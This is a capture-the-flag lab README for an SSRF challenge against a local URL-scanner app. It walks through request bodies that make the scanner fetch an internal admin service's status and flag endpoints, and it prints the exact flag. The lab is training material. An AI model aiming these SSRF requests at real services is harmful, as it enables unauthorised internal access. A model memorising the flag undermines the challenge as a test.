# Challenge 03 — SSRF & Internal Service Discovery

> Quick solve guide: see [CHEATSHEET.md](./CHEATSHEET.md)

## 1. Objective
Use the URL scanner to reach an internal-only service and retrieve the restricted objective flag.

## 2. Target
`scanner.internal.lab`

## 3. Application
URL Inspection Service that fetches submitted URLs server-side and returns diagnostic output.

## 4. Learning objectives
- SSRF basics
- Internal service discovery
- Server-side request boundaries

## 5. Prerequisites
- App running on `localhost:3005`
- Dependencies installed

## 6. Starting the lab
```bash
npm install
npm run dev -- -p 3005
```

## 7. Verify the target
- Browser: `http://localhost:3005/targets/scanner`
- Optional hostname mode: `http://scanner.internal.lab:3005/`

## 8. Challenge walkthrough
1) Probe scanner behavior with invalid input:
- Method: `POST`
- Endpoint: `/api/scanner/api/scan`
- Body:
```json
{"url":"not-a-url"}
```
- Expected: `400` invalid URL

2) Test non-allowed external destination:
- Method: `POST`
- Endpoint: `/api/scanner/api/scan`
- Body:
```json
{"url":"http://example.com/"}
```
- Expected: `403` outside inspection network

3) Enumerate internal service:
- Method: `POST`
- Endpoint: `/api/scanner/api/scan`
- Body:
```json
{"url":"http://internal-admin.internal.lab/api/status"}
```
- Expected: `200` with internal status

4) Retrieve internal objective:
- Method: `POST`
- Endpoint: `/api/scanner/api/scan`
- Body:
```json
{"url":"http://internal-admin.internal.lab/api/flag"}
```
- Expected: `200` with `CYBERLAB{ssrf_internal_network}`

5) Submit flag:
- Method: `POST`
- Endpoint: `/api/scanner/submit`
- Body:
```json
{"flag":"CYBERLAB{ssrf_internal_network}"}
```
- Expected: `{ "accepted": true }`

## 9. Why it works
The scanner is intentionally allowed to call an internal service (`internal-admin.internal.lab`) and returns upstream output.

## 10. Completion condition
- Restricted internal response is retrieved
- Correct flag is submitted

## 11. How to verify completion
- Visit `/challenges/ssrf-internal-service-discovery`
- Evidence count includes `retrieved` and `submitted`

## 12. Resetting the challenge
- Method: `POST`
- Endpoint: `/api/scanner/reset`
- Expected: progress/session reset

## 13. Troubleshooting
- URL always rejected: ensure hostname is `internal-admin.internal.lab`.
- Upstream JSON parse error: retry with `/api/status`, `/api/notes`, or `/api/flag`.
- Challenge not completing: retrieve `/api/flag` before submitting.
- DNS/hostname confusion: this challenge performs server-side routing internally.

## 14. Expected behavior
- Invalid URLs fail safely.
- External destinations are blocked.
- Internal admin endpoints are reachable only through scanner flow.

## 15. Security lesson
Server-side URL fetch features can be abused for internal recon/data access when destination controls are weak.

## 16. Developer notes
- Scanner API: `src/app/api/scanner/[...path]/route.ts`
- Internal service route: `src/app/api/internal-admin/[...path]/route.ts`
- Session cookie name: `scanner_session`
